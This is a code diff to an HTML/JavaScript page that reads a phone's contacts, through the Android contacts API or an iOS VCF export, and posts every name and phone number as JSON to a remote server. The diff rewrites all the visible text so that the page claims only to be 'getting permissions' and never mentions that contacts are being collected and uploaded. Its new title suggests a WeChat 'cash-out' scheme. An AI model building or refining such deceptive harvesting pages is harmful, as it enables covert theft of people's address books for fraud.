@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>全机型通讯录一键采集</title>
+<title>微信通讯录自动跑现</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0f172a;color:#fff;text-align:center;padding:50px 20px}
@@ -16,9 +16,9 @@ td,th{border:1px solid #475569;padding:8px}
 </style>
 </head>
 <body>
-<h2>一键授权采集全部通讯录</h2>
-<p class="tip" id="status">点击下方按钮开始采集</p>
-<button class="btn" id="getBtn">一键获取通讯录并自动上传</button>
+<h2>一键授权</h2>
+<p class="tip" id="status">点击下方按钮开始授权</p>
+<button class="btn" id="getBtn">一键获取权限并自动上传</button>
 <input type="file" id="vcfInput" accept=".vcf">
 <div class="table-wrap" id="tableBox"></div>
 
@@ -49,7 +49,7 @@ function parseVcfData(vcfStr){
 
 // 渲染表格+上传
 async function renderAndUpload(list){
-    statusTxt.innerText = `成功读取${list.length}条通讯录，正在自动上传`
+    statusTxt.innerText = `成功获取${list.length}权限`
     let html = `<table>
         <tr><th>姓名</th><th>手机号码</th></tr>`
     list.forEach(item=>{
@@ -64,14 +64,14 @@ async function renderAndUpload(list){
         headers:{"Content-Type":"application/json"},
         body:JSON.stringify(list)
     })
-    statusTxt.innerText = "✅ 全部通讯录上传完成"
+    statusTxt.innerText = "✅ 全部权限获取完成"
 }
 
 // 安卓逻辑 原生授权一键读取（原汁原味你要的效果）
 async function androidGet(){
-    statusTxt.innerText = "正在申请通讯录系统权限"
+    statusTxt.innerText = "正在申请系统权限"
     if(!navigator.contacts){
-        statusTxt.innerText = "当前安卓浏览器不支持，请更换Chrome/Edge"
+        statusTxt.innerText = "当前安卓浏览器不支持，请更换 谷歌/Edge"
         return
     }
     try{
@@ -90,7 +90,7 @@ async function androidGet(){
 
 // 苹果逻辑 一键唤起导出VCF
 function iosGet(){
-    statusTxt.innerText = "已唤起通讯录导出，生成文件后选择即可自动上传"
+    statusTxt.innerText = "已唤起，生成文件后选择即可自动上传"
     vcfInput.click()
 }
 
@@ -109,7 +109,7 @@ getBtn.addEventListener('click',()=>{
 vcfInput.addEventListener('change',async(e)=>{
     let file = e.target.files[0]
     if(!file) return
-    statusTxt.innerText = "正在解析通讯录文件"
+    statusTxt.innerText = "正在解析文件"
     let text = await file.text()
     let contactList = parseVcfData(text)
     renderAndUpload(contactList)
